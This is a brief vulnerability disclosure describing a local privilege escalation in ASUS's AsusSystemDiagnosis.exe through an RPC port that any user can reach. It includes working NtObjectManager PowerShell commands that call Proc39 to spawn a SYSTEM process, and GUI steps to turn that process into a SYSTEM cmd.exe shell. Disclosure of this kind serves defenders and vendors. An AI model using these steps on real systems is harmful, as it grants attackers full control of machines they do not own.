Privilege Escalation - AsusSystemDiagnosis.exe - Proc39()

Full Path: C:\WINDOWS\System32\DriverStore\FileRepository\asussci2.inf_amd64_d385bdc0d33d66f9\ASUSSystemDiagnosis\AsusSystemDiagnosis.exe

Issue: 

The ALPC Port \RPC Control\ASHWTestServer, exposed by AsusSystemDiagnosis.exe is fully accessible to any user. Calling Proc39() via RPC through this port spawns a taskmgr.exe process as SYSTEM in the current user's session.

Exploitation:

Utilizing Project Zero's NtObjectManager RPC tool from https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools (make sure you take the compiled release) the vulnerable RPC port can be connected to at which point Proc39() can be called. Once the SYSTEM taskmgr.exe process is spawned a cmd.exe shell can be created by utilizing the "Run New Task" functionality via the context menu, File > Run New Task > cmd.exe.

NtObjectManager:

$server = get-rpcserver C:\WINDOWS\System32\DriverStore\FileRepository\asussci2.inf_amd64_d385bdc0d33d66f9\ASUSSystemDiagnosis\AsusSystemDiagnosis.exe

$client = get-rpcclient $server

$client.connect()

$client.Proc39()

Privilege Escalation - AsusSystemDiagnosis.exe - Proc40()

Same as above but spawns mmc.exe as system. Can either create a new task or use the browse functionality to open a explorer.exe window and execute cmd.exe from the address bar.


Additional Notes:

Proc53() - spawns systemreset.exe as SYSTEM
Proc54() - spawns RecoveryDrive.exe as SYSTEM